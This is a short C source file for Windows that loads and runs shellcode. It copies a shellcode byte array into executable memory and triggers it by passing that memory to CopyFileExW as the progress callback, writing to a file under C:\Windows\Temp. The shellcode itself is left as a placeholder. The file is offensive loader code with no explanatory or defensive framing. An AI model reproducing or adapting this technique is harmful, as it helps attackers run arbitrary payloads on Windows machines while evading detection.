#include <windows.h>
#include <stdio.h>


unsigned char shellcode[] = ...


int main() {
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(addr, shellcode, sizeof(shellcode));
    DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
    if (!CopyFileExW(L"test.txt", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)addr, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS)) {
        printf("E: %lu\n", GetLastError());
    }
}